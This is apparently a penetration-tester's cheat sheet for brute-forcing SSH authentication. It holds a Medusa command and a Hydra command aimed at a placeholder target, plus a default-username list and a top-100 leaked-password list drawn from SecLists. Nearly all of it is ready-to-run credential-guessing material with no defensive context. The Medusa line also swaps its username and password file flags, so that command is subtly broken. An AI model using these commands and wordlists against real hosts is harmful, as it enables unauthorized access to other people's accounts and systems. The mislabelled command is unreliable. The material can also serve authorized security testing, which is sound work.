# Authentication bruteforcing

## Medusa

```bash
medusa -h RHOST -M ssh -U PASSWORDS -P USERNAMES
```

## Hydra

```bash
hydra -L USERNAMES -P PASSWORDS SSH://TARGET -T 64
```

## Default credentials

SecLists/Usernames/top-usernames-shortlist.txt
```
root
admin
test
guest
info
adm
mysql
user
administrator
oracle
ftp
pi
puppet
ansible
ec2-user
vagrant
azureuser
```

SecLists/Passwords/darkweb2017-top100.txt
```
123456
123456789
111111
password
qwerty
abc123
12345678
password1
1234567
123123
1234567890
000000
12345
iloveyou
1q2w3e4r5t
1234
123456a
qwertyuiop
monkey
123321
dragon
654321
666666
123
myspace1
a123456
121212
1qaz2wsx
123qwe
123abc
tinkle
target123
gwerty
1g2w3e4r
gwerty123
zag12wsx
7777777
qwerty1
1q2w3e4r
987654321
222222
qwe123
qwerty123
zxcvbnm
555555
112233
fuckyou
asdfghjkl
12345a
123123123
1q2w3e
qazwsx
computer
aaaaaa
159753
iloveyou1
fuckyou1
princess
789456123
11111111
123654
princess1
888888
linkedin
michael
sunshine
football
11111
777777
1234qwer
999999
j38ifUbn
monkey1
football1
daniel
azerty
a12345
123456789a
789456
asdfgh
love123
abcd1234
jordan23
88888888
5201314
12qwaszx
FQRG7CS493
ashley
asdf
asd123
superman
jessica
love
samsung
shadow
blink182
333333
michael1
babygirl1
```